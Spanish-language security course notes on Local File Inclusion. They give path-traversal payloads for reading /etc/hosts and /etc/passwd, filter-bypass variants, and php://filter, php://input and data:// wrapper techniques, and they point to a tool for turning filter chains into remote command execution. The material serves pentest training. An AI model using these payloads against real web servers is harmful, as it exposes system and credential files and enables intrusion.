# Local File Incrusion (LFI)

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

Ejemplo de LFI:

```
http://IP?filename=/etc/host //no esta sanetizado
?filename=../../../../../../etc/hosts // sanetizado con filtro de busqueda en la ruta /var/www/html
?filename?....//....//....//....//....//etc/hosts // en caso de que ../ sea remplazada por un caracter vacio
?filename?../../../../../etc//./hosts // en caso de que este sanetizada la ruta ej(/etc/hosts, /etc/passwd) se ponen dos barras // o /./ y sigue funcionando
?filename?../../../../../etc/passwd%00 para persiones de php antiguas
```

### Uso de filtro/wrappers

#### php://filter

```
// Convierte el contenido en base64
php://filter/convert.base64-encode/resource=secret.php
// Leer contenido en Base64
echo -n "PD9waHAKCS8vTm8gZGViZXJpYXMgcG9kZXIgdmVybWUgZGFkbyBxdWUgZXN0ZSBjb2RpZ28gZGViZXJpYSBkZSBzZXIgaW50ZXJwcmV0YWRvCgllY2hvICJIb2xhIHF1ZSB0YWwiOwo/Pgo=" | base64 -d
// Convierte el contenido en cifrado cesar//rotacion de 13 posiciones en las letras del abecedario
php://filter/read=string.rot13/resource=secret.php
// Leer el contenido en cifrado cesar
cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
```

#### php:input

<div align="left">

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

</div>

#### data://&#x20;

Encodeamos en base64

<div align="left">

<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

</div>

agregamos el comando seguido de data://text/plain,base64,

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

* **PHP Filter Chain Generator**: [https://github.com/synacktiv/php\_filter\_chain\_generator](https://github.com/synacktiv/php\_filter\_chain\_generator)
